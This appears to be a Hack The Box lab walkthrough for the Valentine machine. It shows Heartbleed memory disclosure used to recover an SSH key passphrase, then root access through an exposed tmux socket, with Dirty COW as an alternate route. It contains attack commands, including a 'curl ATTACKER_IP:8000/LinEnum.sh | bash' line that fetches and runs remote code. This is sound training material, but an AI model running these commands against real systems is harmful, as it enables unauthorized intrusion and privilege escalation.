---
title: "Valentine"
description: "Hack The Box Valentine walkthrough covering service enumeration, the Heartbleed vulnerability, initial access and Linux privilege escalation."
category: "Hack The Box"
date: "2021-09-15"
tags:
  - "Hack The Box"
  - "Linux"
  - "Heartbleed"
  - "OpenSSL"
  - "Privilege Escalation"
status: "PUBLISHED"
---

# Valentine

> **LAB ENVIRONMENT** — This writeup documents security testing performed against the Hack The Box Valentine machine in an intentionally vulnerable training environment.

## Overview

Valentine is a Linux-based Hack The Box machine centred around the Heartbleed vulnerability in OpenSSL.

The attack path involved:

```text
Service Enumeration
        ↓
Heartbleed Discovery
        ↓
Memory Disclosure
        ↓
Credential Recovery
        ↓
SSH Private Key Discovery
        ↓
SSH Access as hype
        ↓
Local Enumeration
        ↓
Exposed Root tmux Session
        ↓
Root Access
```

## Enumeration

Initial enumeration was performed to identify the services exposed by the target.

![Initial Nmap enumeration](/writeups/valentine/nmap.png)

Vulnerability-focused Nmap scanning was then performed:

```bash
sudo nmap --script vuln 10.10.10.79
```

SSLyze was also used to specifically test the target for Heartbleed:

```bash
sslyze --heartbleed 10.10.10.79
```

The service was reported as:

```text
VULNERABLE
```

## Heartbleed

The identified SSL service was vulnerable to Heartbleed.

![Heartbleed vulnerability identified](/writeups/valentine/heartbleed.png)

A Heartbleed proof-of-concept script was used against the target:

```bash
python heartbleed.py 10.10.10.79
```

The returned memory contained an interesting Base64-encoded value:

```text
aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

![Base64 data recovered from Heartbleed](/writeups/valentine/exploit.png)

The value was decoded from Base64.

![Decoding the recovered Base64 value](/writeups/valentine/decoder0.png)

The decoded value was:

```text
heartbleedbelievethehype
```

This appeared to be a credential or passphrase and was retained for later testing.

## Private Key Discovery

Further web enumeration identified:

```text
https://10.10.10.79/dev/hype_key
```

The contents were represented as hexadecimal data.

After converting the hexadecimal data to ASCII, an encrypted RSA private key was recovered:

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,<REDACTED>

<PRIVATE KEY REDACTED>

-----END RSA PRIVATE KEY-----
```

The private key was saved locally:

```bash
nano hype.key
```

The file permissions were restricted so that SSH would accept the key:

```bash
chmod 600 hype.key
```

## Initial Access

The recovered key was then used to authenticate to the target as the `hype` user:

```bash
ssh -i hype.key hype@10.10.10.79
```

The private key required a passphrase.

The value previously recovered through Heartbleed was supplied:

```text
heartbleedbelievethehype
```

Authentication succeeded, providing shell access as:

```text
hype
```

This demonstrated the importance of correlating findings from different stages of an assessment. The private key alone was encrypted, while the Heartbleed disclosure alone exposed only a seemingly arbitrary value. Together they provided authenticated access to the system.

## Privilege Escalation Enumeration

Local enumeration was performed after obtaining the initial shell.

LinEnum was transferred from the attacking system using a temporary Python HTTP server:

```bash
python3 -m http.server 8000
```

It was then executed on the target:

```bash
curl ATTACKER_IP:8000/LinEnum.sh | bash
```

Running processes were also manually inspected:

```bash
ps -ef | grep root
```

An interesting root-owned process was identified:

```text
root  1026  1  0 19:04 ?  00:00:00 /usr/bin/tmux -S /.devs/dev_sess
```

This indicated that root had an existing tmux session using the socket:

```text
/.devs/dev_sess
```

The permissions on the socket were inspected:

```bash
ls -la /.devs/dev_sess
```

The result showed:

```text
srw-rw---- 1 root hype ... /.devs/dev_sess
```

Critically, the socket belonged to the `hype` group and was accessible by the compromised user.

## Root Access

Because the `hype` user could access the root-owned tmux socket, it was possible to attach to the existing session.

Using the socket:

```bash
tmux -S /.devs/dev_sess
```

The resulting shell was checked:

```bash
id
```

The session was running as:

```text
root
```

This provided full administrative control of the Valentine host.

## Privilege Escalation Path

The primary privilege-escalation path was therefore:

```text
hype shell
    │
    ▼
Process Enumeration
    │
    ▼
Root tmux Process
    │
    ▼
/.devs/dev_sess
    │
    ▼
Socket Accessible by hype
    │
    ▼
Attach to Existing tmux Session
    │
    ▼
ROOT
```

## Alternate Privilege Escalation Method

The original lab notes also documented Dirty COW as an alternate privilege-escalation method.

A public proof of concept was copied into:

```bash
nano dirty.c
```

The exploit was compiled:

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

and executed:

```bash
./dirty
```

The original lab workflow then switched to the account created by the proof of concept:

```bash
su firefart
```

Running:

```bash
id
```

confirmed root privileges.

This was an alternate route and was not required for the primary compromise because access to the existing privileged tmux session already provided a significantly simpler path to root.

## Key Observations

Several weaknesses and pieces of exposed information were chained together during the compromise:

- The SSL service was vulnerable to Heartbleed.
- Heartbleed exposed sensitive information from process memory.
- The leaked Base64 value decoded to a usable private-key passphrase.
- An encrypted SSH private key was exposed through the web service.
- Combining the leaked passphrase with the exposed key provided SSH access as `hype`.
- Local process enumeration revealed a root-owned tmux session.
- The `hype` user could access the tmux socket.
- Attaching to the existing session provided root access.

## Attack Path

The complete observed attack path was:

```text
[ VALENTINE ]
      │
      ▼
Service Enumeration
      │
      ▼
Heartbleed Identified
      │
      ▼
OpenSSL Memory Disclosure
      │
      ▼
Base64 Value Recovered
      │
      ▼
heartbleedbelievethehype
      │
      ├───────────────────┐
      │                   │
      ▼                   ▼
/dev/hype_key       Key Passphrase
      │                   │
      └─────────┬─────────┘
                ▼
        SSH Authentication
                │
                ▼
            hype Shell
                │
                ▼
        Process Enumeration
                │
                ▼
       Root tmux Session
                │
                ▼
       Accessible Socket
                │
                ▼
              ROOT
```

## Conclusion

Valentine demonstrates how an information-disclosure vulnerability can become significantly more serious when combined with other exposed resources.

Heartbleed did not directly provide a shell. Instead, it leaked a value from memory that became useful when an encrypted SSH private key was subsequently discovered through the web service.

Combining those two pieces of information provided authenticated access as the `hype` user.

Local enumeration then revealed a root-owned tmux session whose socket was accessible to the compromised account. Attaching to that session crossed the final privilege boundary and resulted in root access.

The key lesson from Valentine is the importance of correlating apparently independent findings:

**vulnerability discovery → information disclosure → credential recovery → authenticated access → local enumeration → privilege escalation.**
